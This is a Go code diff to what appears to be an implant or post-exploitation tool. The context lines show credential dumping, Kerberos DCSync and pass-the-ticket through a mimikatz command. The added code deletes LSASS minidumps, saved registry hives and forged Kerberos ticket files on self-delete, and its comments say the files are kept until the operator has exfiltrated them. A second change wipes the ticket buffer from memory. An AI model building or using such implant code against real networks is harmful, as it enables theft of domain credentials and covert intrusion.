@@ -81,6 +81,32 @@ func dumpCreds() (string, error) {
 	return out.String(), nil
 }
 
+// cleanupCredDumpFiles removes the on-disk artifacts produced by dumpCreds
+// (LSASS minidump + registry hive saves) as well as any staged Kerberos ticket
+// files. These contain live credential material and must never be left behind
+// after the implant is removed. Best-effort: every removal failure is swallowed
+// because the operator may have already exfiltrated them, and a partial cleanup
+// must not block uninstall. This is intentionally NOT called right after a
+// dump — the operator still needs the files for exfil — only on uninstall /
+// self-delete.
+func cleanupCredDumpFiles() {
+	tmp := os.Getenv("TEMP")
+	if tmp == "" {
+		tmp = `C:\Windows\Temp`
+	}
+	for _, name := range []string{"lsass.dmp", "sam.save", "system.save", "security.save"} {
+		_ = os.Remove(filepath.Join(tmp, name))
+	}
+	if entries, err := os.ReadDir(tmp); err == nil {
+		for _, e := range entries {
+			n := e.Name()
+			if strings.HasPrefix(n, "forge_ticket_") && strings.HasSuffix(n, ".kirbi") {
+				_ = os.Remove(filepath.Join(tmp, n))
+			}
+		}
+	}
+}
+
 func kerberosDCSync(user string) (string, error) {
 	cmd := ""
 	if user == "" {
@@ -165,6 +191,10 @@ func kerberosPassTheTicket(ticketB64 string) (string, error) {
 	if err := os.WriteFile(ticketFile, ticketData, 0o600); err != nil {
 		return "", fmt.Errorf("write ticket: %v", err)
 	}
+	// ticketData holds a live credential (the decoded .kirbi); scrub it from the
+	// heap as soon as it has been written to disk. Go strings are immutable and
+	// cannot be wiped, but this []byte buffer can and must be.
+	zeroizeKey(ticketData)
 	defer os.Remove(ticketFile)
 
 	mimikatzCmd := fmt.Sprintf("kerberos::ptt %s", ticketFile)
